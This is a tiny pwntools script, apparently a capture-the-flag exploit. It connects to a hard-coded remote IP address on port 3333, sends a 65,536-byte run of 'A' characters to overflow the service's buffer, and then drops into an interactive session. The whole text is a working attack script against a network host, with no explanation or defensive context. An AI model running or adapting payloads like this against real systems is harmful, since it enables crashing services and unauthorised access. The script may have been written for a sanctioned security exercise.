from pwn import*

s = remote('51.254.114.246',3333)
s.send('A'*0x10000)

s.interactive()
